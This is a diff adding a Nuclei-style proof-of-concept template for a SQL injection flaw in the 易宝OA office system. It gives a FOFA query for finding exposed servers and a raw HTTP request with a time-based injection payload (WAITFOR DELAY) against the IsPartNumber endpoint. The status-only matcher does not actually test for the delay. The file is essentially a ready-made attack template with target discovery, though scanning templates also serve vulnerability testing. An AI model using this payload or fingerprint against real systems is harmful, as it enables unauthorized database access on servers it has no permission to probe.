@@ -1,0 +1,29 @@
+id: poc-ziszbxaiqf257kl2
+info:
+  name: 易宝OA StockTakeIsPartNumber存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ziszbxaiqf257kl2'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ziszbxaiqf257kl2
+    fofa: (title="欢迎登录易宝OA系统" && body="/Content/css/OAstyle.css") || body="$.cookie(\"topvision_oaName"
+http:
+- raw:
+  - 'GET /SmartTradeScan/StockTake/IsPartNumber?pn=1''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
